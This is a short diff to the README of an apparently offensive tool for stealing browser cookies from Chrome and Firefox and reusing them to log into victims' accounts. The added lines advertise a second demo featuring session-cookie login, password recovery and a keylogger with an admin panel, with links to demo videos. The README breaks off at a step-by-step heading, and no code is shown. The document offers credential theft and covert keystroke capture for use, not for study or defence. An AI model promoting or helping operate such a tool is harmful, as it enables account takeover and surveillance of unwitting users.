@@ -1,9 +1,15 @@
 # steal-cookie-chrome-firefox
 steal cookie for chrome and mozilla firefox, use another extension to login with the cookie stealed
 
-demo video youtube 
+# demo video youtube Part 1
 
 https://youtu.be/jvoUF_WQ3sY 
+
+# demo Facebook Part 2 :
+
+Login with cookie stealed ,password recovery +keylogger with admin panel
+
+https://www.facebook.com/102313318301415/videos/2889519731295268
 
 
 how to start steep by steep ?
